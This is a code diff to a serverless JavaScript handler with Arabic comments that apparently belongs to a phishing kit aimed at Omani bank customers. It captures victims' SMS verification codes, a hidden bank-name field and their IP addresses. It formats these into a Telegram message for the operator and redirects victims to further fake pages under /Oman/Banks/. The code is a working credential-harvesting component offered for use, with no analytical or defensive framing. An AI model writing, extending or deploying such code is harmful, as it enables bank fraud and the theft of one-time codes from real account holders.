@@ -12,18 +12,22 @@ exports.handler = async (event) => {
 
     const smsCode = params.get('s1') || '-'; // رمز التحقق
 
+    // استدعاء اسم البنك من الحقل المخفي
+    const bankName = params.get('bank_name') || 'غير محدد';
+    
     // استخراج IP المستخدم
     const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';
 
     // 3. تحديد الصفحة التالية (Redirect)
     // عادة بعد الـ SMS يتم التوجيه لصفحة انتظار ثانية أو صفحة خطأ لطلب الرمز مرة أخرى
     // عدل هذا الرابط حسب صفحتك القادمة
-    const nextPage = '/Oman/Banks/loading.html'; 
+    const nextPage = '/Oman/Banks/sms.html'; 
 
     // 4. تنسيق الرسالة لتليجرام
     const message = `
 📩 **رمز تحقق جديد (SMS)**
 ---------------------------
+🏢 **البنك:** ${bankName}
 🔑 **كود التحقق:** \`${smsCode}\`
 
 🌐 **IP:** ${userIp}
@@ -54,7 +58,7 @@ exports.handler = async (event) => {
     return {
       statusCode: 302,
       headers: {
-        'Location': '/Oman/Banks/loading.html', // نفس رابط الصفحة التالية في حال الخطأ
+        'Location': '/Oman/Banks/sms.html', // نفس رابط الصفحة التالية في حال الخطأ
       },
     };
   }
